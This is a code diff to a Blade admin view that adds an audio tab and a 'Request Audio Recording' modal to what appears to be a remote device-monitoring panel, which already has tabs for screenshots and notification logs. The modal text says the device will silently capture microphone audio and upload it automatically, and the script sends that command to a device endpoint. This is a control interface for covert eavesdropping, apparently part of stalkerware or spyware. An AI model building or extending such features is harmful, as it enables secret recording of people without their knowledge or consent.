@@ -62,6 +62,9 @@
         <button class="tab" onclick="switchTab('notifications', this)">
             <i class="fas fa-bell" style="margin-right:6px;"></i> Notifications ({{ $notificationLogs->total() }})
         </button>
+        <button class="tab" onclick="switchTab('audio', this)">
+            <i class="fas fa-microphone" style="margin-right:6px;"></i> Audio ({{ $audioRecordings->total() }})
+        </button>
     </div>
 
     <!-- Screenshots Tab -->
@@ -260,6 +263,89 @@
         </div>
         @endif
     </div>
+
+    <!-- Audio Recordings Tab -->
+    <div id="tab-audio" class="tab-content" style="display:none;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
+            <h4 style="font-size:16px;font-weight:600;color:#f1f5f9;">Voice & Audio Recordings</h4>
+            <button class="btn btn-primary btn-sm" onclick="openRequestAudioModal()">
+                <i class="fas fa-microphone"></i> Request New Recording
+            </button>
+        </div>
+
+        @if($audioRecordings->count() > 0)
+        <div class="data-table-wrapper">
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width:200px;">Duration</th>
+                        <th>Player</th>
+                        <th style="width:250px;">Recorded At</th>
+                        <th style="width:150px;">Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    @foreach($audioRecordings as $recording)
+                    <tr>
+                        <td>
+                            <span style="display:flex;align-items:center;gap:6px;font-weight:500;color:#f1f5f9;">
+                                <i class="fas fa-file-audio" style="color:#6366f1;"></i>
+                                {{ gmdate('i:s', $recording->duration_seconds) }} ({{ $recording->duration_seconds }}s)
+                            </span>
+                        </td>
+                        <td>
+                            <audio controls style="width:100%;max-width:350px;height:32px;">
+                                <source src="{{ route('admin.audio.serve', $recording) }}" type="audio/mp4">
+                                Your browser does not support the audio element.
+                            </audio>
+                        </td>
+                        <td>
+                            <span style="font-size:13px;color:#94a3b8;">
+                                {{ $recording->recorded_at->format('M d, Y · h:i:s A') }}
+                            </span>
+                        </td>
+                        <td>
+                            <a href="{{ route('admin.audio.serve', $recording) }}" download class="btn btn-outline btn-sm" style="padding:4px 10px;">
+                                <i class="fas fa-download"></i> Download
+                            </a>
+                        </td>
+                    </tr>
+                    @endforeach
+                </tbody>
+            </table>
+        </div>
+        <div style="margin-top:24px;">{{ $audioRecordings->appends(['tab' => 'audio'])->links() }}</div>
+        @else
+        <div class="empty-state">
+            <i class="fas fa-microphone"></i>
+            <p>No audio recordings captured yet.</p>
+        </div>
+        @endif
+    </div>
+
+    <!-- Request Audio Modal -->
+    <div class="modal-overlay" id="requestAudioModal" onclick="closeRequestAudioModal()">
+        <div class="modal" onclick="event.stopPropagation()" style="width:400px;padding:24px;border-radius:12px;background:#1a1f35;border:1px solid #2a3150;">
+            <h3 style="margin-bottom:16px;color:#f1f5f9;font-size:18px;">Request Audio Recording</h3>
+            <p style="font-size:13px;color:#94a3b8;margin-bottom:20px;">
+                Select the duration for the background recording. The device will silently capture audio from its microphone and upload it automatically over HTTP.
+            </p>
+            <div style="display:flex;flex-direction:column;gap:12px;margin-bottom:24px;">
+                <label style="font-size:12px;font-weight:600;color:#64748b;text-transform:uppercase;">Duration</label>
+                <select id="audioDurationSelect" style="width:100%;padding:10px;border-radius:8px;background:#0a0e1a;border:1px solid #2a3150;color:#f1f5f9;outline:none;">
+                    <option value="30">30 Seconds</option>
+                    <option value="60">1 Minute</option>
+                    <option value="120" selected>2 Minutes</option>
+                    <option value="300">5 Minutes</option>
+                    <option value="600">10 Minutes</option>
+                </select>
+            </div>
+            <div style="display:flex;justify-content:flex-end;gap:10px;">
+                <button class="btn btn-outline" onclick="closeRequestAudioModal()">Cancel</button>
+                <button class="btn btn-primary" onclick="submitRequestAudio({{ $device->id }})">Send Command</button>
+            </div>
+        </div>
+    </div>
 @endsection
 
 @section('scripts')
@@ -305,6 +391,32 @@
         if (res.success) {
             showToast(res.message, 'success');
             setTimeout(() => location.reload(), 1000);
+        }
+    }
+
+    function openRequestAudioModal() {
+        document.getElementById('requestAudioModal').classList.add('active');
+    }
+
+    function closeRequestAudioModal() {
+        document.getElementById('requestAudioModal').classList.remove('active');
+    }
+
+    async function submitRequestAudio(deviceId) {
+        const duration = document.getElementById('audioDurationSelect').value;
+        closeRequestAudioModal();
+        showToast('Sending recording command...', 'info');
+        
+        try {
+            const res = await apiPost(`/admin/devices/${deviceId}/request-audio`, { duration_seconds: duration });
+            if (res.success) {
+                showToast(res.message, 'success');
+                setTimeout(() => location.reload(), 1500);
+            } else {
+                showToast(res.message || 'Failed.', 'error');
+            }
+        } catch (e) {
+            showToast('An error occurred.', 'error');
         }
     }
 </script>
